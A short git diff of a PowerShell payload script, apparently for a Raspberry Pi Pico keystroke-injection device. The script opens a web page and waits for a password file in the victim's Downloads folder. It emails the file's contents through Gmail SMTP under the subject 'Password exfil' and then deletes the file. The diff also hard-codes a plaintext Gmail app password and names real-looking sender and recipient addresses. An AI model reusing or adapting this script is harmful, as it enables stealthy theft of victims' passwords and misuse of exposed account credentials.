@@ -1,25 +1,27 @@
-# Pfad zur zu überprüfenden Datei
-$dateiPfad = "C:\Users\marwi\Downloads\pw.txt"
+# path to password file
+$pathtodownloads = (New-Object -ComObject Shell.Application).NameSpace('shell:Downloads').Self.Path
+$pathtofile = "$pathtodownloads\pw.txt"
 
-# E-Mail-Konfiguration
+# set config for email
 $From = "injectionkeystroke@gmail.com"
 $To = "maklo119@hhu.de"
 $Subject = "Password exfil from $($env:computername)"
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $password
+$Password = "wxmukckmhuetdmvt" | ConvertTo-SecureString -AsPlainText -Force
+$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 
-# Webseite im Standard-Browser öffnen
+# open page in standard browser
 Start-Process -FilePath "https://marwinkloefer.github.io/DuckyPiPico/"
 
-# Endlosschleife, die auf die Existenz der Datei wartet
-while (-not (Test-Path $dateiPfad)) {
+# wait for file to exist
+while (-not (Test-Path $pathtofile)) {
     Start-Sleep -Seconds 1
 }
 
 # Dateiinhalt auslesen
-$content = Get-Content -Path $dateiPfad
-
+$content = Get-Content -Path $pathtofile
+# Send mail
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $content -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
 
-# Datei löschen
-Remove-Item -Path $dateiPfad -Force
+# Delete file
+Remove-Item -Path $pathtofile -Force
 exit
